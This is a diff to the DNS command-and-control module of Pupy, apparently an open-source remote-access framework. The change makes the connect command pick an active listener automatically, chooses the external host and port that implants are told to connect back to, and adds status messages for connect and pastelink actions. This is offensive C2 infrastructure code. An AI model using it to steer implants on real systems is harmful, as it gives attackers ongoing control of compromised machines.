@@ -6,7 +6,7 @@ from network.lib.picocmd.picocmd import *
 from Queue import Queue
 
 from pupylib.PupyConfig import PupyConfig
-from pupylib.utils.network import get_listener_ip, get_listener_port
+from pupylib.utils.network import get_listener_ip_with_local, get_listener_port
 
 import requests
 import netifaces
@@ -133,10 +133,12 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
 
 class PupyDnsCnc(object):
     def __init__(
-            self, igd=None, connect_host=None,
+            self, igd=None,
             recursor=None,
-            connect_transport='ssl', connect_port=443,
-            config=None, credentials=None
+            config=None,
+            credentials=None,
+            listeners=None,
+            cmdhandler=None,
         ):
 
         credentials = credentials or Credentials()
@@ -145,6 +147,8 @@ class PupyDnsCnc(object):
         self.config = config
         self.credentials = credentials
         self.igd = igd
+        self.listeners = listeners
+        self.cmdhandler = cmdhandler
 
         fdqn = self.config.get('pupyd', 'dnscnc').split(':')
         domain = fdqn[0]
@@ -155,16 +159,6 @@ class PupyDnsCnc(object):
 
         listen = str(config.get('pupyd', 'address') or '0.0.0.0')
         prefer_external = config.getboolean('gen', 'external')
-
-        self.host = [
-            str(get_listener_ip(
-                external=prefer_external,
-                config=config,
-                igd=igd
-            ))
-        ]
-        self.port = get_listener_port(config, external=prefer_external)
-        self.transport = config.get('pupyd', 'transport')
 
         recursor = config.get('pupyd', 'recursor')
         if recursor and recursor.lower() in ('no', 'false', 'stop', 'n', 'disable'):
@@ -201,10 +195,55 @@ class PupyDnsCnc(object):
           or self.handler.find_sessions(spi=node)
 
     def connect(self, host=None, port=None, transport=None, node=None, default=False):
+        if not all([host, port, transport]):
+            listeners = self.listeners()
+            if not listeners:
+                raise ValueError(
+                    'No active listeners. Host port and transport shoul be explicitly specified')
+
+            listener = None
+            local = False
+
+            if transport:
+                listener = listeners.get(transport)
+                if not listener:
+                    raise ValueError('Listener for transport {} not found'.format(transport))
+
+            else:
+                for l in listeners.itervalues():
+                    if not l.local:
+                        listener = l
+                        break
+
+                if not listener:
+                    listener = next(listeners.itervalues())
+                    local = True
+
+            if not listener:
+                raise ValueError('No listeners found')
+
+            if local:
+                _port = get_listener_port(self.config, external=True)
+                _host, local = get_listener_ip_with_local(
+                    config=self.config, external=True, igd=self.igd)
+
+                if local:
+                    raise ValueError('External host:port not found. Please explicitly specify them')
+
+                host = host or _host
+                port = port or _port
+                transport = listener.name
+            else:
+                host = host or listener.external
+                port = port or listener.external_port
+                transport = listener.name
+
+            if self.cmdhandler:
+                self.cmdhandler.display_success('Connect: Transport: {} Host: {} Port: {}'.format(
+                    transport, host, port))
+
         return self.handler.connect(
-            self.host if host is None else [ host ],
-            self.port if port is None else port,
-            self.transport if transport is None else transport,
+            [ host ], port, transport,
             node=node,
             default=default
         )
@@ -256,6 +295,10 @@ class PupyDnsCnc(object):
             raise ValueError('couldn\'t create pastelink url')
 
         count = self.handler.pastelink(url, action, node=node, default=default)
+        if count and self.cmdhandler:
+            self.cmdhandler.display_success('Pastelink: Url: {} Action: {}'.format(
+                url, action))
+
         return count, url
 
     @property
